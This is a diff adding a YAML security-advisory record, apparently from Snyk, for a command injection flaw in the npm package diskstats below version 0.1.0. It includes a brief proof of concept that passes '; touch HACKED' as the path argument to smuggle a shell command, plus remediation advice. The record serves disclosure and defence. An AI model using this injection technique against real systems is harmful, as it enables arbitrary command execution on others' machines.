@@ -1,0 +1,31 @@
+---
+- id: snykio:npm:diskstats:590099
+  title: Command Injection
+  description: "[diskstats][1] is a library that uses df to pull disk information
+    such\nas free space &amp; inode utilization on your system.\n\nAffected versions
+    of this package are vulnerable to Command Injection.\nThe `path` parameter is
+    used to build the command that is passed to the\n`child_process.exec` function
+    without any check.\n\n### PoC by Alessio (d3lla)   {#poc-by-alessio-d3lla}\n\n1.
+    \ create a directory for testing\n    \n        mkdir poc\n        cd poc/\n\n2.
+    \ install diskstats module: `npm i diskstats`\n^\n\n1.  create the following PoC
+    JavaScript file (poc.js):\n    \n        const diskstats = require('diskstats');\n
+    \       diskstats.check('; touch HACKED', (err, results) => {});\n\n2.  make sure
+    that the HACKED file does not exist: `ls`\n\n3.  execute the poc.js file: `node
+    poc.js`\n\n4.  the HACKED file is created: `ls`\n    \n    ## Remediation   {#remediation}\n
+    \   \n    Upgrade `diskstats` to version 0.1.0 or higher.\n    \n    ## References
+    \  {#references}\n{: start=\"3\"}\n\n* [GitHub Commit][2]\n* [HackerOne Report][3]\n\n\n\n[1]:
+    https://www.npmjs.com/package/diskstats\n[2]: https://github.com/PhilipSkinner/diskstats/commit/5631570fcaea48e9e86735c7e68757aa3c44e106\n[3]:
+    https://hackerone.com/reports/864354\n"
+  affected_package: diskstats
+  vulnerable_versions:
+  - "<0.1.0"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-07-23
+  created_date: 2020-07-24
+  last_modified_date: 2020-07-24
+  credit:
+  - d3lla
+  source_url: https://snyk.io/vuln/SNYK-JS-DISKSTATS-590099
